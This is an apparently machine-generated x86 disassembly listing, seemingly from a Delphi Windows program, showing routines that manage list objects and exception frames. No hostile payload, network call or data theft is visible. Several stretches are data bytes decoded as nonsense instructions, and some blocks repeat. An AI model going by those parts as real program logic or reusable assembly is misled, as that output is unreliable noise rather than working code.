add [ ecx + ebp + 0x54110043 ] cl
push ebx
je r-xdata
insd
jae r-xdata
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
inc ebx
add [ eax ] al
sub al [ ebx ]
fsubr [ edx ]
inc ebx
add [ esp + ebp + 0x43 ] ah
add [ esp + ebp ] dh
inc ebx
add [ eax ] bh
sub al 0x43
add [ edi ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x51ec8b55
and al 0x23
inc edx
add [ eax + 0x23 ] bh
inc edx
add [ edi + edx * 8 ] al
inc esp
add [ edi + ebp * 4 ] bl
inc ebp
add [ eax - 0x29 ] bh
inc esp
add [ edi + ebp * 4 + 0x45 ] al
add al dl
or eax 0xd8f00045
inc esp
add [ edi + edx * 8 - 0x506bffbc ] ch
inc ebp
add [ eax - 0x1bffba51 ] ch
xlat
inc esp
add al dl
scasd [ edi ]
inc ebp
add [ eax - 0x28 ] al
inc esp
add al bl
scasd [ edi ]
inc ebp
add [ eax - 0x28 ] ah
inc esp
add al ah
scasd [ edi ]
inc ebp
add al bl
or eax 0xd9540045
inc esp
add [ ecx + ebx * 8 - 0x277fffbc ] dl
inc esp
add ah dh
scasd [ edi ]
inc ebp
add al bh
scasd [ edi ]
inc ebp
add [ eax + ebx * 8 - 0x29ebffbc ] ah
inc esp
add ah ch
sub [ ebx ] eax
jo r-xdata
nop
cld
sbb al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x69560700
jae r-xdata
adc [ eax ] al
xchg [ eax ] al
add bh bh
adc [ ebp + 0x10045 ] dh
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
je r-xdata
add ah ch
and [ edx ] eax
sbb [ ebx ] eax
hlt
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
or [ edi + 0x6e ] cl
push ebp
jo r-xdata
fcom [ ebx ]
inc ebx
add al al
add [ eax ] al
insd
xor edx edx
push ebp
push sub_431e1f
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_431d0d
fadd [ eax + eax - 0x70 ]
and al [ edx ]
and al 0x23
inc edx
add [ eax + 0x23 ] bh
inc edx
add [ edi + edx * 8 ] al
inc esp
add [ edi + ebp * 4 ] bl
inc ebp
add [ eax - 0x29 ] bh
inc esp
add [ edi + ebp * 4 + 0x45 ] al
add al dl
or eax 0xd8f00045
inc esp
add [ edi + edx * 8 - 0x506bffbc ] ch
inc ebp
add [ eax - 0x1bffba51 ] ch
xlat
inc esp
add al dl
scasd [ edi ]
inc ebp
add [ eax - 0x28 ] al
inc esp
add al bl
scasd [ edi ]
inc ebp
add [ eax - 0x28 ] ah
inc esp
add al ah
scasd [ edi ]
inc ebp
add al bl
or eax 0xd9540045
inc esp
add [ ecx + ebx * 8 - 0x277fffbc ] dl
inc esp
add ah dh
scasd [ edi ]
inc ebp
add al bh
scasd [ edi ]
inc ebp
add [ eax + ebx * 8 - 0x29ebffbc ] ah
inc esp
add ah ch
sub [ ebx ] eax
jo r-xdata
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
inc ebx
add [ eax ] al
sub al [ ebx ]
fsubr [ edx ]
inc ebx
add [ esp + ebp + 0x43 ] ah
add [ esp + ebp ] dh
inc ebx
add [ eax ] bh
sub al 0x43
add [ edi ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x51ec8b55
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_431e1f
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_431da4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_431e1f
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_431e3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41964c
mov [ esi + 0x18 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_431e78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4043d8
test eax eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4196f0
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_40416c
pop esi
pop ebx
retn
sub_431ed8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_432070
push eax
mov edx esi
mov eax ebx
call sub_432070
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x28 ]
pop edi
pop esi
pop ebx
retn
sub_431f14
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1d ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_419a38
dec eax
jle r-xdata
push esi
mov eax ebx
call sub_419a38
mov ecx eax
dec ecx
xor edx edx
mov eax ebx
call sub_431fdc
sub_431f44
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
pop ebx
retn
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_408210
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_4081d8
jmp r-xdata
pop ebx
retn
sub_431f80
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_432070
mov ebp eax
mov edx edi
mov eax ebx
call sub_432070
mov [ esp ] eax
mov edx esi
mov eax ebx
call sub_432070
call sub_4196d8
mov esi eax
mov edx edi
mov eax ebx
call sub_432070
call sub_4196d8
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx esi
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_431fdc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_431f80
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_431fdc
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4320a8
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_419d80
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x1d ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4320f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45b000
mov [ esi + 0xc8 ] 0xffffffff
mov [ esi + 0x60 ] 0x0
mov dl 0x1
mov eax esi
call sub_45b2b8
mov dl 0x1
mov eax esi
call sub_4322e0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_432148
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x1
xor eax eax
push ebp
push sub_432261
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x0
retn
mov eax edi
mov edx [ r-xdata ]
call sub_4034cc
mov ecx eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_418cf8
cmp edi [ eax + 0x20 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_418cf8
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4034cc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_418cf8
pop edx
mov ecx [ eax ]
call [ ecx + 0x8c ]
sub_432270
push ebx
push ecx
mov [ esp ] 0xffffffff
cmp [ eax + 0xba ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_4322ac
push ebx
mov ebx eax
mov eax ebx
call sub_421ecc
mov al [ ebx + 0xa1 ]
test al al
je r-xdata
mov eax [ ebx + 0xac ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_4322e0
pop ebx
retn
mov edx eax
mov eax ebx
call sub_4323e0
sub_4322e0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xa0 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa0 ] dl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa1 ] dl
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
cmp eax 0xffffffff
je r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43244c
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x1
xor eax eax
push ebp
push sub_4323ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_418cf8
mov dl [ ebp - 0x5 ]
mov ecx [ eax ]
call [ ecx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_418cf8
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
sub_4323e0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
test ebp ebp
je r-xdata
cmp ebp [ ebx + 0xa4 ]
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0xa4 ] ebp
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xac ] ebp
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418cf8
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418cf8
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
sub_43244c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xc8 ] ebp
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418cf8
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418cf8
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
sub_4324ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0xd2 ] 0x0
setne bl
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0xd4 ]
call [ esi + 0xd0 ]
sub_4324fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4325cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
cmp esi eax
jge r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
call sub_403ad0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4325d2
lea eax [ ebp - 0x18 ]
call sub_404118
lea eax [ ebp - 0xc ]
call sub_404118
retn
sub_4325dc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
sub cl 0x1
jb r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
dec cl
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4034cc
mov eax [ eax + 0x28c ]
call sub_43db74
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ esp ]
mov edx [ eax + 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc esi
xor ebp ebp
inc ebp
dec esi
jne r-xdata
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_437c64
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_437704
mov eax [ esp ]
mov ecx [ eax + 0x18 ]
xor edx edx
mov eax ebx
call sub_4378bc
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4377b4
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ esp ]
call sub_4196d8
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_418cf8
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov eax [ esp ]
call sub_4196d8
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_4385bc
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_418cf8
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
sub_432770
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_419d14
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
mov eax [ eax + 0x50 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
inc ebp
mov [ esp ] 0x0
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_4034cc
mov esi eax
mov eax ebx
call sub_4196d8
mov edx eax
mov eax [ esi + 0x28c ]
call sub_432070
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebx + 0x18 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebx + 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc [ esp ]
dec ebp
jne r-xdata
mov eax ebx
call sub_4196d8
mov edx eax
mov eax [ esi + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_437cf0
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
call sub_437704
mov ecx [ ebx + 0x18 ]
xor edx edx
mov eax esi
call sub_4378bc
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4377b4
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx [ esp ]
call sub_418cf8
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
sub_43288c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4320f0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4320a8
mov esi eax
mov [ ebx + 0xd0 ] esi
mov [ esi + 0x28 ] ebx
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4328ec
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0xd0 ]
call sub_40d814
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45b054
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_432928
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov esi edx
mov edi eax
test esi esi
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ edi + 0xd0 ]
call sub_419a38
cmp esi eax
jl r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ edi + 0xd0 ]
call sub_432070
mov edx eax
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ edi + 0xda ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx edi
mov eax [ edi + 0xdc ]
call [ edi + 0xd8 ]
sub_432994
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_432070
mov edx [ eax + 0x10 ]
mov eax edi
call sub_40416c
pop edi
pop esi
pop ebx
retn
sub_4329c8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_432070
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop edi
pop esi
pop ebx
retn
sub_432a00
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_432a2c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_422340
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
cmp [ esi + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_432ae0
sub_432a70
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
pop esi
pop ebx
retn
mov eax esi
call sub_432ae0
mov eax [ esi + 0x10 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
sub_432ae0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_432c23
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432c2a
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov ebx [ esi + 0x10 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034cc
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_432070
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x90 ]
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x94 ]
mov eax [ edi + 0xd0 ]
